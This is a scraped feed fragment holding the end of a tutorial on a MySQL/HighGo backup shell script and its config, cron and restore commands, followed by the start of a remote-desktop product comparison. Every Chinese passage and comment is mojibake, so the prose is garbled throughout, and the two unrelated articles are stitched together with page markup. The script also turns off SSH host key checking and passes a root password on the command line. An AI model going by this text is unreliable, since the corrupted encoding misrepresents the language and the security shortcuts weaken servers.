<pre><code class="hljs language-bash" lang="bash">Â <span class="hljs-comment"># æ¯å¤©å‡Œæ™¨ 02:00 æ‰§è¡Œå…¨é‡å¤‡ä»½</span>
Â 0 2 * * * /bin/bash /opt/db_backup/db_backup.sh
</code></pre>
<h3 data-id="heading-20">ä»æœåŠ¡å™¨ (Slave - ä»…åŒæœºæ¨¡å¼éœ€è¦)</h3>
<pre><code class="hljs language-bash" lang="bash">Â <span class="hljs-comment"># æ¯å¤©å‡Œæ™¨ 03:00 æ¸…ç†è¿‡æœŸå¤‡ä»½</span>
Â 0 3 * * * /bin/bash /opt/db_backup/db_backup.sh
</code></pre>
<h2 data-id="heading-21">7. ç¾éš¾æ¢å¤æŒ‡å—</h2>
<p>å½“éœ€è¦æ¢å¤æ•°æ®æ—¶ï¼Œè¯·å…ˆå°† <code>.sql.gz</code> æ–‡ä»¶è§£å‹ï¼Œç„¶åå¯¼å…¥ã€‚</p>
<h3 data-id="heading-22">7.1 MySQL æ¢å¤</h3>
<p><strong>Docker ç¯å¢ƒ</strong>:</p>
<pre><code class="hljs language-xml" lang="xml">Â # 1. è§£å‹æ•°æ®æµ -&gt; 2. ä¼ å…¥å®¹å™¨ -&gt; 3. æ‰§è¡Œå¯¼å…¥
Â gunzip &lt; backup_file.sql.gz | docker exec -i <span class="hljs-tag">&lt;<span class="hljs-name">å®¹å™¨å</span>&gt;</span> mysql -u root -p<span class="hljs-tag">&lt;<span class="hljs-name">å¯†ç </span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">æ•°æ®åº“å</span>&gt;</span>
</code></pre>
<p><strong>ç‰©ç†æœºç¯å¢ƒ</strong>:</p>
<pre><code class="hljs language-xml" lang="xml">Â gunzip &lt; backup_file.sql.gz | mysql -u root -p<span class="hljs-tag">&lt;<span class="hljs-name">å¯†ç </span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">æ•°æ®åº“å</span>&gt;</span>
</code></pre>
<h3 data-id="heading-23">7.2 HighGo (ç€šé«˜) æ¢å¤</h3>
<p><strong>Docker ç¯å¢ƒ</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">Â <span class="hljs-comment"># æ³¨æ„: HighGo å®¹å™¨å†…é€šå¸¸ä½¿ç”¨ psql å·¥å…·</span>
Â gunzip &lt; backup_file.sql.gz | docker <span class="hljs-built_in">exec</span> -i &lt;å®¹å™¨å&gt; psql -h 127.0.0.1 -p 5866 -U sysdba -d &lt;æ•°æ®åº“å&gt;
</code></pre>
<p><strong>ç‰©ç†æœºç¯å¢ƒ</strong>:</p>
<pre><code class="hljs language-css" lang="css">Â gunzip &lt; backup_file<span class="hljs-selector-class">.sql</span><span class="hljs-selector-class">.gz</span> | psql -h localhost -<span class="hljs-selector-tag">p</span> <span class="hljs-number">5866</span> -U sysdba -d &lt;æ•°æ®åº“å&gt;
</code></pre>
<h2 data-id="heading-24">8. å¸¸è§é—®é¢˜ (FAQ)</h2>
<p><strong>Q1: è„šæœ¬æ‰§è¡ŒæŠ¥é”™ <code>/db_backup/db_backup.conf: line 2: $'\r': command not found</code></strong></p>
<ul>
<li><strong>åŸå› </strong>: è„šæœ¬æ–‡ä»¶ (<code>db_backup.sh</code>) æˆ–é…ç½®æ–‡ä»¶ (<code>db_backup.conf</code>) æ˜¯åœ¨ <strong>Windows</strong> ç¯å¢ƒä¸‹ç¼–è¾‘æˆ–ä¿å­˜çš„ã€‚</li>
<li><strong>è§£å†³</strong>: æ‰§è¡Œå‘½ä»¤ï¼š<strong><code>sed -i 's/\r$//' db_backup.sh db_backup.conf</code></strong></li>
</ul>
<p><strong>Q2: è„šæœ¬æ‰§è¡ŒæŠ¥é”™ <code>Permission denied (publickey)</code></strong></p>
<ul>
<li><strong>åŸå› </strong>: åŒæœºæ¨¡å¼ä¸‹ SSH å…å¯†äº’ä¿¡æœªé…ç½®æˆåŠŸã€‚</li>
<li><strong>è§£å†³</strong>: å‚è€ƒç¬¬ 2 èŠ‚é‡æ–°é…ç½®ã€‚<strong>å¦‚æœæ˜¯å•æœºæ¨¡å¼ï¼Œè¯·ç¡®ä¿ <code>SLAVE_IP</code> å·²ç½®ç©ºã€‚</strong></li>
</ul>
<p><strong>Q3: æç¤º <code>mysqldump: command not found</code></strong></p>
<ul>
<li><strong>åŸå› </strong>: ç‰©ç†æœºæ¨¡å¼ä¸‹å®¿ä¸»æœºæ²¡è£…å®¢æˆ·ç«¯ï¼Œæˆ–è€… Docker æ¨¡å¼ä¸‹ <code>DOCKER_CONTAINER_NAME</code> å¿˜å¡«äº†ã€‚</li>
<li><strong>è§£å†³</strong>: æ£€æŸ¥ <code>DOCKER_CONTAINER_NAME</code> é…ç½®ã€‚</li>
</ul>
<p><strong>Q4: ä¸ºä»€ä¹ˆæ—§æ–‡ä»¶æ²¡è¢«åˆ é™¤ï¼Ÿ</strong></p>
<ul>
<li><strong>åŸå› </strong>: è„šæœ¬ç°åœ¨ä½¿ç”¨<strong>æ–‡ä»¶åä¸­çš„æ—¥æœŸ</strong> (<code>YYYYMMDD_HHMMSS</code>) æ¥åˆ¤æ–­æ–‡ä»¶å¹´é¾„ã€‚</li>
<li><strong>è§£å†³</strong>: è¯·æ£€æŸ¥æ—§æ–‡ä»¶çš„å‘½åæ ¼å¼æ˜¯å¦ä¸º <code>åº“å_YYYYMMDD_HHMMSS.sql.gz</code>ã€‚å¦‚æœå‘½åä¸ç¬¦åˆæ­¤è§„èŒƒï¼Œè„šæœ¬ä¸ºé˜²æ­¢è¯¯åˆ ä¼šè·³è¿‡è¯¥æ–‡ä»¶ã€‚</li>
</ul>
<h2 data-id="heading-25">9. è„šæœ¬å†…å®¹</h2>
<h3 data-id="heading-26">9.1 db_backup.conf ï¼ˆé…ç½®æ–‡ä»¶ï¼‰</h3>
<pre><code class="hljs language-conf" lang="conf">#!/bin/bash

# ================= æ ¸å¿ƒæ¨¡å¼é…ç½® =================
# æ•°æ®åº“ç±»å‹: MYSQL æˆ– HIGHGO
DB_TYPE="MYSQL"

# âš ï¸ [Docker æ”¯æŒ]
# å¡«å†™å®¹å™¨åç§°(å¦‚ "mysql_prod")å¼€å¯ Docker æ¨¡å¼ï¼›ç•™ç©ºåˆ™ä¸ºå®¿ä¸»æœºæ¨¡å¼
DOCKER_CONTAINER_NAME="mysql_prod"

# è„šæœ¬è§’è‰²: MASTER (å¤‡ä»½+ä¼ è¾“+æ¸…ç†) æˆ– SLAVE (ä»…æ¸…ç†)
SCRIPT_ROLE="MASTER"

# ================= åŸºç¡€è·¯å¾„ =================
BACKUP_DIR="/data/backup/database"
LOG_FILE="/var/log/db_backup.log"

# ================= æ•°æ®åº“è¿æ¥é…ç½® (Master å¡«å†™) =================
DB_HOST="127.0.0.1"
DB_PORT="3306" 
DB_USER="root"
DB_PASS="ä½ çš„æ•°æ®åº“å¯†ç "
# å¤šä¸ªæ•°æ®åº“ä½¿ç”¨ç©ºæ ¼éš”å¼€
DB_LIST="db_project_a db_project_b"

# ================= ä¼ è¾“é…ç½® (Master å¡«å†™) =================
# âš ï¸ [å¯é€‰åŠŸèƒ½] âš ï¸
# å¦‚æœéœ€è¦åŒæœºå¼‚åœ°å¤‡ä»½ï¼Œè¯·å¡«å†™ä»æœåŠ¡å™¨ä¿¡æ¯ï¼ˆéœ€é…ç½® SSH å…å¯†äº’ä¿¡ï¼‰ã€‚
# å¦‚æœåªéœ€è¦å•æœºæœ¬åœ°å¤‡ä»½ï¼Œè¯·å°† SLAVE_IP ç•™ç©º ("")ï¼Œè„šæœ¬å°†è‡ªåŠ¨è·³è¿‡ä¼ è¾“æ­¥éª¤ã€‚
SLAVE_IP="192.168.1.200"

SLAVE_PORT="22"
SLAVE_USER="root"
SLAVE_DEST_DIR="/data/backup/database"

# ================= æ¸…ç†ç­–ç•¥ =================
MASTER_KEEP_DAYS=7
SLAVE_KEEP_DAYS=30
</code></pre>
<h3 data-id="heading-27">9.2 db_backup.sh ï¼ˆshellè„šæœ¬ï¼‰</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash">!/bin/bash</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">================= ç¯å¢ƒå‡†å¤‡ =================</span>
SCRIPT_DIR=$(cd $(dirname $0); pwd)
CONF_FILE="$SCRIPT_DIR/db_backup.conf"

if [ -f "$CONF_FILE" ]; then
    source "$CONF_FILE"
else
    echo "Error: é…ç½®æ–‡ä»¶ $CONF_FILE ä¸å­˜åœ¨ï¼"
    exit 1
fi

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [$DB_TYPE] $1" | tee -a "$LOG_FILE"
}

if [ ! -d "$BACKUP_DIR" ]; then
    mkdir -p "$BACKUP_DIR"
fi

DATE_STR=$(date +%Y%m%d_%H%M%S)
<span class="hljs-meta prompt_">
# </span><span class="bash">================= è¾…åŠ©å‡½æ•°ï¼šæ ¹æ®æ–‡ä»¶åæ¸…ç†è¿‡æœŸå¤‡ä»½ =================</span>
<span class="hljs-meta prompt_"># </span><span class="bash">åŸç†ï¼šæå–æ–‡ä»¶åä¸­çš„ YYYYMMDD_HHMMSSï¼Œæ ¼å¼åŒ–ä¸ºæ ‡å‡†æ—¥æœŸåå¯¹æ¯”æ—¶é—´æˆ³</span>
cleanup_by_filename() {
    local target_dir=$1
    local keep_days=$2
    
    local current_timestamp=$(date +%s)
    local threshold_seconds=$(($keep_days * 86400))
    local cutoff_timestamp=$(($current_timestamp - $threshold_seconds))
    
    local cutoff_date_str=$(date -d @$cutoff_timestamp "+%Y-%m-%d %H:%M:%S")

    log "&gt;&gt;&gt; æ‰§è¡Œæ¸…ç†æ£€æŸ¥: ä¿ç•™å¤©æ•°=$keep_days (æˆªæ­¢æ—¶é—´: $cutoff_date_str)"

    shopt -s nullglob
    for file in "$target_dir"/*.sql.gz; do
        filename=$(basename "$file")
        
        # åŒ¹é…æ ¼å¼ï¼šä»»æ„å‰ç¼€_YYYYMMDD_HHMMSS.sql.gz
        if [[ $filename =~ _([0-9]{8})_([0-9]{6})\.sql\.gz$ ]]; then
            d_part="${BASH_REMATCH[1]}"
            t_part="${BASH_REMATCH[2]}"
            
            # æ‰‹åŠ¨æ‹¼æ¥æˆ ISO æ ¼å¼: YYYY-MM-DD HH:MM:SS
            year=${d_part:0:4}
            month=${d_part:4:2}
            day=${d_part:6:2}
            hour=${t_part:0:2}
            minute=${t_part:2:2}
            second=${t_part:4:2}
            
            formatted_date="$year-$month-$day $hour:$minute:$second"
            
            file_timestamp=$(date -d "$formatted_date" +%s 2&gt;/dev/null)
            
            if [ $? -eq 0 ]; then
                if [ "$file_timestamp" -lt "$cutoff_timestamp" ]; then
                    log "ğŸ—‘ï¸ [åˆ é™¤] è¿‡æœŸæ–‡ä»¶: $filename (æ—¥æœŸ: $formatted_date)"
                    rm -f "$file"
                else
                    :
                fi
            else
                log "âš ï¸ [è·³è¿‡] æ—¥æœŸè§£æå¤±è´¥: $filename"
            fi
        else
            log "âš ï¸ [è·³è¿‡] å‘½åæ ¼å¼ä¸ç¬¦: $filename"
        fi
    done
    shopt -u nullglob
    log "&gt;&gt;&gt; æ¸…ç†æ£€æŸ¥å®Œæˆ."
}
<span class="hljs-meta prompt_">
# </span><span class="bash">================= æ ¸å¿ƒé€»è¾‘ =================</span>

if [ "$SCRIPT_ROLE" == "MASTER" ]; then
    log "=== å¼€å§‹æ‰§è¡Œ MASTER å¤‡ä»½ä»»åŠ¡ ==="
    
    if [ -n "$DOCKER_CONTAINER_NAME" ]; then
        log "æ£€æµ‹åˆ° Docker æ¨¡å¼ï¼Œå®¹å™¨åç§°: $DOCKER_CONTAINER_NAME"
    fi

    for DB_NAME in $DB_LIST; do
        FILE_NAME="${DB_NAME}_${DATE_STR}.sql.gz"
        FILE_PATH="$BACKUP_DIR/$FILE_NAME"
        
        log "æ­£åœ¨å¤‡ä»½æ•°æ®åº“: $DB_NAME ..."
        
        # &gt;&gt;&gt;&gt;&gt;&gt; å¤‡ä»½é€»è¾‘ &lt;&lt;&lt;&lt;&lt;&lt;
        BACKUP_STATUS=1

        if [ "$DB_TYPE" == "MYSQL" ]; then
            if [ -n "$DOCKER_CONTAINER_NAME" ]; then
                docker exec "$DOCKER_CONTAINER_NAME" mysqldump -h"$DB_HOST" -P"$DB_PORT" -u"$DB_USER" -p"$DB_PASS" \
                    --single-transaction --set-gtid-purged=OFF "$DB_NAME" 2&gt;/dev/null | gzip &gt; "$FILE_PATH"
                BACKUP_STATUS=${PIPESTATUS[0]}
            else
                mysqldump -h"$DB_HOST" -P"$DB_PORT" -u"$DB_USER" -p"$DB_PASS" \
                    --single-transaction --set-gtid-purged=OFF "$DB_NAME" 2&gt;/dev/null | gzip &gt; "$FILE_PATH"
                BACKUP_STATUS=${PIPESTATUS[0]}
            fi

        elif [ "$DB_TYPE" == "HIGHGO" ]; then
            if [ -n "$DOCKER_CONTAINER_NAME" ]; then
                docker exec -e PGPASSWORD="$DB_PASS" "$DOCKER_CONTAINER_NAME" \
                    pg_dump -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME" | gzip &gt; "$FILE_PATH"
                BACKUP_STATUS=${PIPESTATUS[0]}
            else
                export PGPASSWORD="$DB_PASS"
                pg_dump -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME" | gzip &gt; "$FILE_PATH"
                BACKUP_STATUS=${PIPESTATUS[0]}
                unset PGPASSWORD
            fi
            
        else
            log "âŒ é”™è¯¯: æœªçŸ¥çš„ DB_TYPE ($DB_TYPE)"
            exit 1
        fi

        if [ $BACKUP_STATUS -eq 0 ]; then
            FILE_SIZE=$(stat -c%s "$FILE_PATH" 2&gt;/dev/null || echo 0)
            if [ "$FILE_SIZE" -gt 20 ]; then
                log "å¤‡ä»½æˆåŠŸ: $FILE_NAME (å¤§å°: $(du -h "$FILE_PATH" | cut -f1))"
                
                # &gt;&gt;&gt;&gt;&gt;&gt; ä¼ è¾“é€»è¾‘ (å…³é”®ä¿®æ”¹) &lt;&lt;&lt;&lt;&lt;&lt;
                if [ -n "$SLAVE_IP" ]; then
                    log "æ­£åœ¨ä¼ è¾“åˆ°ä»æœåŠ¡å™¨ ($SLAVE_IP) ..."
                    
                    # 1. å…ˆå°è¯•åœ¨è¿œç¨‹åˆ›å»ºç›®å½• (é˜²æ­¢ç›®å½•ä¸å­˜åœ¨å¯¼è‡´scpå¤±è´¥)
                    # -o StrictHostKeyChecking=no: ç¦æ­¢äº¤äº’å¼è¯¢é—®æŒ‡çº¹
                    ssh -p "$SLAVE_PORT" -o StrictHostKeyChecking=no "$SLAVE_USER@$SLAVE_IP" "mkdir -p $SLAVE_DEST_DIR" &gt;&gt; "$LOG_FILE" 2&gt;&amp;1
                    
                    # 2. æ‰§è¡Œ SCP ä¼ è¾“
                    scp -P "$SLAVE_PORT" -o StrictHostKeyChecking=no "$FILE_PATH" "$SLAVE_USER@$SLAVE_IP:$SLAVE_DEST_DIR" &gt;&gt; "$LOG_FILE" 2&gt;&amp;1
                    
                    if [ $? -eq 0 ]; then
                        log "ä¼ è¾“æˆåŠŸ."
                    else
                        log "âŒ ä¼ è¾“å¤±è´¥! è¯·æ£€æŸ¥æ—¥å¿—è¯¦æƒ… (å¯èƒ½æ˜¯ç½‘ç»œã€äº’ä¿¡æˆ–ç£ç›˜æ»¡)ã€‚"
                    fi
                else
                    log "â„¹ï¸  è·³è¿‡ä¼ è¾“: æœªé…ç½®ä»æœåŠ¡å™¨ IP (å•æœºæ¨¡å¼)"
                fi
            else
                 log "âŒ å¤‡ä»½å¤±è´¥: æ–‡ä»¶å¤§å°å¼‚å¸¸ã€‚"
                 rm -f "$FILE_PATH"
            fi
        else
            log "âŒ å¤‡ä»½å¤±è´¥: å‘½ä»¤æ‰§è¡Œé”™è¯¯ã€‚"
            rm -f "$FILE_PATH"
        fi
    done

    cleanup_by_filename "$BACKUP_DIR" "$MASTER_KEEP_DAYS"

elif [ "$SCRIPT_ROLE" == "SLAVE" ]; then
    log "=== å¼€å§‹æ‰§è¡Œ SLAVE æ¸…ç†ä»»åŠ¡ ==="
    if [ -d "$BACKUP_DIR" ]; then
        cleanup_by_filename "$BACKUP_DIR" "$SLAVE_KEEP_DAYS"
    else
        log "âŒ å¤‡ä»½ç›®å½•ä¸å­˜åœ¨ã€‚"
    fi
else
    log "âŒ SCRIPT_ROLE é”™è¯¯"
    exit 1
fi
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[8K360å¸§æé™æˆ˜ï¼ToDeskæºä¸‰å¤§é»‘ç§‘æŠ€ç¡¬åˆšå‘æ—¥è‘µ_Splashtop_RustDeskï¼Œè°æ‰æ˜¯2026è¿œç¨‹æ§åˆ¶å¤©èŠ±æ¿ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597278451029098506</link>    <guid>https://juejin.cn/post/7597278451029098506</guid>    <pubDate>2026-01-20T10:23:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597278451029098506" data-draft-id="7597024900522065972" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="8K360å¸§æé™æˆ˜ï¼ToDeskæºä¸‰å¤§é»‘ç§‘æŠ€ç¡¬åˆšå‘æ—¥è‘µ_Splashtop_RustDeskï¼Œè°æ‰æ˜¯2026è¿œç¨‹æ§åˆ¶å¤©èŠ±æ¿ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T10:23:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¢œæ·¡æ…•æ½‡"/> <meta itemprop="url" content="https://juejin.cn/user/4494459266678318"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            8K360å¸§æé™æˆ˜ï¼ToDeskæºä¸‰å¤§é»‘ç§‘æŠ€ç¡¬åˆšå‘æ—¥è‘µ_Splashtop_RustDeskï¼Œè°æ‰æ˜¯2026è¿œç¨‹æ§åˆ¶å¤©èŠ±æ¿ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4494459266678318/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¢œæ·¡æ…•æ½‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:23:53.000Z" title="Tue Jan 20 2026 10:23:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»24åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>å¼•è¨€</strong></p>
<p>å½“ä½ ä½œä¸ºITè¿ç»´ï¼Œä¸å¾—ä¸åƒæµæ°´çº¿å·¥äººä¸€æ ·é€å°ç”µè„‘é‡å¤ä¼ è¾“æ–‡ä»¶ï¼›å½“ä½ æ¯æ¬¡æƒ³å¿«é€Ÿæ”¹ä¸ªè®¾è®¡ç¨¿ï¼Œéƒ½è¦å…ˆç»è¿‡è¿æ¥æ¡Œé¢ã€å¯»æ‰¾ç¨‹åºã€ç­‰å¾…å¯åŠ¨çš„å†—é•¿è·¯å¾„â€”â€”ä½ ä¼šå‘ç°ï¼š<strong>å½“å‰å¤§å¤šæ•°äº§å“ä»åœç•™åœ¨â€œ<strong><strong>å®ç°åŸºç¡€è¿æ¥</strong></strong>â€çš„åˆçº§é˜¶æ®µï¼Œè€Œå¯¹â€œ<strong><strong>æ·±åº¦ç”Ÿäº§åŠ›åœºæ™¯â€å’Œâ€œæè‡´ä½“éªŒéœ€æ±‚</strong></strong>â€çš„å“åº”ä¸¥é‡ä¸è¶³ã€‚</strong> å½“è¿œç¨‹åŠå…¬ã€æ··åˆåŠå…¬ã€åˆ†å¸ƒå¼å›¢é˜Ÿæˆä¸ºå¸¸æ€ï¼Œå½“æ¸¸æˆä¸²æµã€è¿œç¨‹åˆ›ä½œã€ITè§„æ¨¡åŒ–è¿ç»´æˆä¸ºåˆšéœ€ï¼Œæˆ‘ä»¬å¯¹è¿œç¨‹æ§åˆ¶çš„æœŸå¾…æ—©å·²ä¸æ­¢äºâ€œè¿å¾—ä¸Šâ€ï¼Œæ›´è¦æ±‚â€œè¿å¾—å¥½â€ã€â€œè¿å¾—é«˜æ•ˆâ€ã€â€œè¿å¾—æ™ºèƒ½â€ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51aa682a2293483f9add5b60c754b93d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=6abnSAU%2FHJvf9mnGXGE4YbBCJAs%3D" alt="" loading="lazy"/></p>
<p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬ç­–åˆ’äº†æœ¬æ¬¡æå…·é’ˆå¯¹æ€§çš„æ¨ªå‘æµ‹è¯„ã€‚<strong>æˆ‘ä»¬ä¸æ³›æ³›è€Œè°ˆåŸºç¡€çš„è¿æ¥ç¨³å®šæ€§æˆ–å¸¸è§„åŠå…¬æ€§èƒ½ï¼Œè€Œæ˜¯ç›´å‡»ä¸‰ä¸ªæœ€è€ƒéªŒè¿œç¨‹æ§åˆ¶æŠ€æœ¯æ·±åº¦ä¸äº§å“ç†å¿µçš„è¿›é˜¶åœºæ™¯ï¼šæé™ç”»è´¨ä¸æµç•…åº¦</strong>ï¼šè¿œç¨‹æ¸¸æˆã€èƒ½å¦è¾¾åˆ°â€œä»£æ›¿æœ¬åœ°å±å¹•â€çš„æ„Ÿå®˜ä½“éªŒï¼Ÿ<strong>ä¸€å¯¹å¤šæ–‡ä»¶ç§’ä¼ </strong>ï¼šé¢å¯¹æˆåä¸Šç™¾å°è®¾å¤‡ï¼Œèƒ½å¦åƒå¹¿æ’­ä¸€æ ·ï¼Œä¸€æ¬¡æ€§å®Œæˆæ–‡ä»¶åˆ†å‘ï¼Œå°†ç®¡ç†å‘˜ä»é‡å¤åŠ³åŠ¨ä¸­å½»åº•è§£æ”¾ï¼Ÿ<strong>æ¸¸æˆä¸åº”ç”¨å¿«æ·å¯åŠ¨</strong>ï¼šèƒ½å¦ç»•è¿‡å†—é•¿çš„æ¡Œé¢è¿æ¥æµç¨‹ï¼Œå®ç°â€œä¸€é”®ç›´è¾¾â€ç›®æ ‡åº”ç”¨ï¼Œè®©è¿œç¨‹æ“ä½œå¦‚æœ¬åœ°èˆ¬ç›´æ¥ï¼Ÿ</p>
<p/>
<p><strong>å‚è¯„é€‰æ‰‹</strong>ï¼Œæˆ‘ä»¬é€‰æ‹©äº†å¸‚åœºä¸Šæœ€å…·ä»£è¡¨æ€§å’ŒæŠ€æœ¯å®åŠ›çš„å››æ¬¾äº§å“ï¼š</p>
<p>â— <strong>ToDesk**** 2026æ–°ç‰ˆ</strong>ï¼šä»¥æ¿€è¿›çš„æŠ€æœ¯è¿­ä»£å’Œåœºæ™¯åŒ–åŠŸèƒ½è‘—ç§°çš„æ–°é”åŠ›é‡ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03625f8f7acd4ef5b3bec5ed748a8274~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=1WDnOrDHrSX9pWM3mmZJ%2FBRmmdQ%3D" alt="" loading="lazy"/></p>
